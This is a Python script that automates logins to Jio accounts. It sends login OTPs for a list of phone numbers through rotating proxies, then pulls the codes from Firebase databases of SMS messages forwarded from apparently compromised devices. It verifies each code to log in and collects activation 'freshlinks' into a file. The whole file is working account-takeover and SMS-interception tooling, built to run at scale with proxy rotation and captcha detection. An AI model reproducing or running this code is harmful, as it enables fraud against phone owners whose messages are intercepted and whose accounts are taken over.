#!/usr/bin/env python3
"""brutal_e2e.py — send OTP, harvest the code, verify, mint the freshlink.

Everything for one number runs inside a single requests.Session bound to one
proxy exit: jio.com binds the OTP to the cookie jar and the origin IP, so the
verify call must reuse both verbatim.

    python3 brutal_e2e.py [--workers 4] [--max 10] [--timeout 60]
"""

from __future__ import annotations

import argparse
import json
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))

from farm import get_activation, jio_session, verify_otp

DATA = Path(__file__).resolve().parent / "data"
LINKS_FILE = DATA / "brutal_freshlinks.jsonl"
STATE_FILE = DATA / "brutal_e2e_state.json"

PANELS = {
    "rtx-c9": "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rtx-c11": "https://rtx-c11-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rtx-c3": "https://rtx-c3-default-rtdb.firebaseio.com",
}
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

OTP_RE = re.compile(
    r"(?<!\d)(\d{6})(?!\d)\s+is your One time password \(OTP\) to sign-in", re.I)
OTP_LOOSE = re.compile(
    r"(?<!\d)(\d{6})(?!\d)\D{0,40}(?:one[\s\-]?time[\s\-]?password|OTP|sign-?in)", re.I)

_LOCK = threading.Lock()


def load_proxies() -> list[str]:
    try:
        d = json.loads((DATA / "proxies_live.json").read_text())
        return [e["proxy"] for e in d if e.get("proxy")]
    except Exception:
        return []


def harvest_otp(panel: str, device: str, mobile: str,
                since: float) -> str | None:
    """Newest Jio OTP forwarded by `device` for `mobile` after `since`."""
    base = PANELS[panel]
    try:
        r = requests.get(
            f"{base}/data/{device}/smsData.json?orderBy=%22%24key%22&limitToLast=15",
            headers={"User-Agent": UA}, timeout=45)
        if r.status_code != 200:
            return None
    except requests.RequestException:
        return None
    best: tuple[float, str] | None = None
    for v in (r.json() or {}).values():
        if not isinstance(v, dict):
            continue
        info = (v.get("info") or "").replace("+91", "")
        if mobile not in info:
            continue
        sender = (v.get("sender") or "").upper()
        if not any(j in sender for j in ("JIONET", "JIOFPS", "JIOPAY", "JIOINF")):
            continue
        m = OTP_RE.search(v.get("message") or "") or \
            OTP_LOOSE.search(v.get("message") or "")
        if not m:
            continue
        try:
            t = time.mktime(time.strptime(v.get("time", "")[:21], "%Y-%m-%d | %H:%M:%S"))
        except ValueError:
            continue
        if t >= since and (best is None or t > best[0]):
            best = (t, m.group(1))
    return best[1] if best else None


def run_one(mobile: str, meta: dict, proxies: list[str],
            timeout: int) -> dict:
    px = random.choice(proxies) if proxies else None
    s = jio_session(px)
    try:
        r = s.post("https://www.jio.com/api/jio-login-service/login/sendOtp",
                   json={"mobileNumber": mobile, "loginFlowType": "MOBILE",
                         "alternateNumber": ""}, timeout=15)
    except requests.RequestException as exc:
        return {"mobile": mobile, "ok": False, "status": f"send_{type(exc).__name__}"}
    d = {}
    try:
        d = r.json()
    except ValueError:
        pass
    up = str(d.get("errorMessage", "")).upper()
    if "INVALID_JIONUMBER" in up:
        return {"mobile": mobile, "ok": False, "status": "not_jio_number"}
    if "LOCKED" in up:
        return {"mobile": mobile, "ok": False, "status": "locked"}
    if "CAPTCHA" in up or r.status_code == 429:
        return {"mobile": mobile, "ok": False, "status": "captcha", "proxy": px}
    if r.status_code != 200 or d.get("errorMessage"):
        return {"mobile": mobile, "ok": False, "status": f"http_{r.status_code}"}

    since = time.time() - 90
    otp = None
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        otp = harvest_otp(meta["panel"], meta["device"], mobile, since)
        if otp:
            break
        time.sleep(3)

    if not otp:
        return {"mobile": mobile, "ok": False, "status": "otp_timeout"}

    if not verify_otp(s, mobile, otp):
        return {"mobile": mobile, "ok": False, "status": "verify_failed", "otp": otp}

    st, url = get_activation(s)
    rec = {"mobile": mobile, "ok": bool(url), "status": st, "otp": otp,
           "panel": meta["panel"], "device": meta["device"],
           "device_name": meta.get("name", ""), "ts": int(time.time())}
    if url:
        rec["url"] = url
        with _LOCK, LINKS_FILE.open("a") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    return rec


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--workers", type=int, default=4)
    ap.add_argument("--max", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=60)
    ap.add_argument("--file", default=str(DATA / "brutal_jio_numbers.json"))
    args = ap.parse_args()

    numbers = json.loads(Path(args.file).read_text())
    proxies = load_proxies()
    done = {json.loads(l)["mobile"] for l in
            LINKS_FILE.read_text().splitlines() if l.strip()} \
        if LINKS_FILE.exists() else set()
    todo = [m for m in numbers if m not in done]
    print(f"[*] {len(todo)} numbers, {len(proxies)} proxies, "
          f"{args.workers} workers", flush=True)

    got = 0
    tried = 0
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {}
        it = iter(todo)

        def submit_next():
            try:
                m = next(it)
            except StopIteration:
                return False
            futs[ex.submit(run_one, m, numbers[m], proxies, args.timeout)] = m
            return True

        for _ in range(args.workers * 2):
            if not submit_next():
                break

        while futs:
            for f in as_completed(list(futs)):
                m = futs.pop(f)
                tried += 1
                try:
                    r = f.result()
                except Exception as exc:
                    print(f"[!] {m} {type(exc).__name__}: {exc}", flush=True)
                else:
                    if r.get("ok"):
                        got += 1
                        print(f"[LINK] {m} otp={r['otp']} panel={r['panel']}",
                              flush=True)
                        print(f"       {r['url']}", flush=True)
                    else:
                        print(f"[{r['status']}] {m}", flush=True)
                if got >= args.max:
                    break
                submit_next()
            if got >= args.max:
                break

    print(f"\n[done] {got} freshlinks / {tried} tried")
    return 0


if __name__ == "__main__":
    sys.exit(main())
